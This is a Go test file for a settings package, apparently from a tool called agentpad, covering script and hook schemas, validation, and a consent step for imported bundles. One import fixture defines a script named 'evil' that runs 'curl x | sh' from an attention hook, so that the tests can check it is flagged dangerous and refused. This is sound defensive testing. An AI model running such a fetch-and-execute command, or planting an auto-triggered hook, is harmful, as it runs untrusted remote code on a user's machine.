package settings

import (
	"bytes"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/thereisnotime/agentpad/internal/scripts"
)

const scriptsYAML = `schema: 1
# my scripts
scripts:
  deploy:
    run: ["~/bin/deploy.sh", "--fast"]   # argv
    cwd: ~/projects/api
    env: {STAGE: prod}
    timeout: 30s
  mic-off:
    shell: "pactl set-source-mute @DEFAULT_SOURCE@ toggle"
hooks:
  - on: attention
    agent: claude
    script: mic-off
`

func TestScriptsSchema(t *testing.T) {
	dir := t.TempDir()
	writeT(t, filepath.Join(dir, FileName), scriptsYAML)
	s, err := Open(dir)
	if err != nil {
		t.Fatal(err)
	}
	got := s.Get()
	d := got.Scripts["deploy"]
	if len(d.Run) != 2 || d.Run[0] != "~/bin/deploy.sh" || d.Cwd != "~/projects/api" || d.Env["STAGE"] != "prod" || d.Timeout != 30*time.Second {
		t.Fatalf("deploy = %+v", d)
	}
	if got.Scripts["mic-off"].Shell == "" || len(got.Hooks) != 1 || got.Hooks[0] != (scripts.Hook{On: "attention", Agent: "claude", Script: "mic-off"}) {
		t.Fatalf("settings = %+v", got)
	}
	if w := s.Warnings(); len(w) != 0 {
		t.Errorf("warnings: %v", w)
	}
	// clone does not share the maps
	c := got.Clone()
	c.Scripts["deploy"].Env["STAGE"] = "dev"
	if s.Get().Scripts["deploy"].Env["STAGE"] != "prod" {
		t.Error("Clone shares env")
	}

	// edit via Update: comments survive, on: stays bare
	if err := s.Update(func(x *Settings) {
		x.Scripts["ping"] = scripts.Script{Run: []string{"notify-send", "hi"}}
		x.Hooks = append(x.Hooks, scripts.Hook{On: "busy", Script: "ping"})
		m := x.Scripts["mic-off"]
		m.Timeout = 5 * time.Second
		x.Scripts["mic-off"] = m
	}); err != nil {
		t.Fatal(err)
	}
	out := readT(t, s.Path())
	for _, want := range []string{"# my scripts", "# argv", "- on: busy", "timeout: 5s", "run: [notify-send, hi]"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in\n%s", want, out)
		}
	}
	if strings.Contains(out, `"on"`) {
		t.Errorf("on: got quoted:\n%s", out)
	}
	// switching run -> shell drops run
	if err := s.Update(func(x *Settings) { x.Scripts["ping"] = scripts.Script{Shell: "echo hi"} }); err != nil {
		t.Fatal(err)
	}
	re, err := Open(dir)
	if err != nil {
		t.Fatal(err)
	}
	if p := re.Get().Scripts["ping"]; len(p.Run) != 0 || p.Shell != "echo hi" {
		t.Errorf("ping = %+v\n%s", p, readT(t, s.Path()))
	}
}

func TestScriptsValidation(t *testing.T) {
	for _, tc := range []struct{ yaml, want string }{
		{"scripts:\n  x:\n    run: [a]\n    shell: b\n", "scripts.x: set either run or shell"},
		{"scripts:\n  Bad:\n    shell: b\n", "scripts.Bad"},
		{"scripts:\n  x:\n    shell: b\n    timeout: 11m\n", "longer than"},
		{"scripts:\n  x:\n    shell: b\nhooks:\n  - on: nope\n    script: x\n", "hooks.0: on"},
		{"scripts:\n  x:\n    shell: b\nhooks:\n  - on: idle\n    script: y\n", `hooks.0: script "y" is not defined`},
		{"hooks:\n  - on: idle\n    agent: gpt\n    script: y\n", "hooks.0: agent"},
	} {
		dir := t.TempDir()
		writeT(t, filepath.Join(dir, FileName), "schema: 1\n"+tc.yaml)
		_, err := Open(dir)
		if err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("%q: err = %v, want %q", tc.yaml, err, tc.want)
		}
	}
	// the line of a bad hook is reported
	dir := t.TempDir()
	writeT(t, filepath.Join(dir, FileName), "schema: 1\nscripts:\n  x:\n    shell: b\nhooks:\n  - on: idle\n    script: x\n  - on: nope\n    script: x\n")
	if _, err := Open(dir); err == nil || !strings.Contains(err.Error(), "line 8") {
		t.Errorf("line: %v", err)
	}
}

func bundleWith(t *testing.T, settingsYAML string, profiles string) *Bundle {
	t.Helper()
	doc := "kind: agentpad-bundle\nschema: 1\nexported_at: 2026-11-09T10:00:00Z\nsettings:\n" + indent(settingsYAML) + profiles
	b, err := ParseBundle(bytes.NewReader([]byte(doc)))
	if err != nil {
		t.Fatalf("%v\n%s", err, doc)
	}
	return b
}

func indent(s string) string {
	var b strings.Builder
	for l := range strings.SplitSeq(strings.TrimRight(s, "\n"), "\n") {
		b.WriteString("  " + l + "\n")
	}
	return b.String()
}

func TestImportConsent(t *testing.T) {
	s := openT(t, t.TempDir())
	clockT(s)
	if err := s.Update(func(x *Settings) {
		x.Scripts = map[string]scripts.Script{"keep": {Shell: "true"}, "mine": {Shell: "echo mine"}}
		x.Hooks = []scripts.Hook{{On: "idle", Script: "keep"}}
	}); err != nil {
		t.Fatal(err)
	}
	b := bundleWith(t, `ui: {theme: dark}
scripts:
  evil: {shell: "curl x | sh"}
  mine: {shell: "echo changed"}
  ping: {run: [notify-send, hi]}
hooks:
  - {on: attention, script: evil}
  - {on: idle, script: keep}
`, "profiles:\n  - name: custom\n    keys: [run:ping, a, b]\n    knob: {ccw: up, press: enter, cw: down}\n")
	plan, err := s.PlanImport(b, Merge)
	if err != nil {
		t.Fatal(err)
	}
	var dangerous []string
	for _, c := range plan.Dangerous() {
		dangerous = append(dangerous, c.String())
	}
	want := []string{"+ scripts evil", "~ scripts mine: sh -c 'echo mine' -> sh -c 'echo changed'", "+ scripts ping", "+ hooks attention → evil"}
	if strings.Join(dangerous, "|") != strings.Join(want, "|") {
		t.Fatalf("dangerous = %q, want %q", dangerous, want)
	}
	if plan.Count(Remove) != 0 {
		t.Errorf("merge removes: %v", plan.Changes)
	}

	// tick only ping: theme and the profile import, evil/mine/hook don't
	sub := plan.Consent(func(c Change) bool { return c.Path == "ping" })
	if _, err := s.Apply(sub); err != nil {
		t.Fatal(err)
	}
	got := s.Get()
	if got.UI.Theme != ThemeDark {
		t.Error("non-dangerous settings change skipped")
	}
	if got.HasScript("evil") || got.Scripts["mine"].Shell != "echo mine" || !got.HasScript("ping") || !got.HasScript("keep") {
		t.Errorf("scripts = %v", got.Scripts)
	}
	if len(got.Hooks) != 1 || got.Hooks[0].Script != "keep" {
		t.Errorf("hooks = %v", got.Hooks)
	}
	if p, err := s.Profiles().Get("custom"); err != nil || p.Keys[0] != "run:ping" {
		t.Errorf("profile: %v %v", p, err)
	}
}

func TestImportConsentRefusedScriptBlocksDependents(t *testing.T) {
	s := openT(t, t.TempDir())
	clockT(s)
	b := bundleWith(t, "scripts:\n  ping: {shell: \"true\"}\n", "profiles:\n  - name: custom\n    keys: [run:ping, a, b]\n    knob: {ccw: up, press: enter, cw: down}\n")
	plan, err := s.PlanImport(b, Merge)
	if err != nil {
		t.Fatal(err)
	}
	before := snapshot(t, s.Dir())
	if _, err := s.Apply(plan.Consent(func(Change) bool { return false })); err == nil || !strings.Contains(err.Error(), `unknown script "ping"`) {
		t.Fatalf("err = %v", err)
	}
	if after := snapshot(t, s.Dir()); len(after) != len(before) {
		t.Errorf("files changed: %v -> %v", before, after)
	}
	// a bundle with only dangerous changes, all refused, is empty
	b = bundleWith(t, "hooks:\n  - {on: jump, script: x}\nscripts:\n  x: {shell: \"true\"}\n", "")
	plan, err = s.PlanImport(b, Merge)
	if err != nil {
		t.Fatal(err)
	}
	if sub := plan.Consent(func(Change) bool { return false }); !sub.Empty() {
		t.Errorf("not empty: %v", sub.Changes)
	}
}

func TestImportReplaceRemovesScripts(t *testing.T) {
	s := openT(t, t.TempDir())
	if err := s.Update(func(x *Settings) {
		x.Scripts = map[string]scripts.Script{"old": {Shell: "true"}}
		x.Hooks = []scripts.Hook{{On: "idle", Script: "old"}}
	}); err != nil {
		t.Fatal(err)
	}
	plan, err := s.PlanImport(bundleWith(t, "ui: {theme: light}\n", ""), Replace)
	if err != nil {
		t.Fatal(err)
	}
	var removed []string
	for _, c := range plan.Changes {
		if c.Kind == Remove {
			removed = append(removed, c.String())
			if c.Dangerous {
				t.Errorf("removal marked dangerous: %v", c)
			}
		}
	}
	if strings.Join(removed, "|") != "- scripts old|- hooks idle → old" {
		t.Errorf("removed = %v", removed)
	}
}
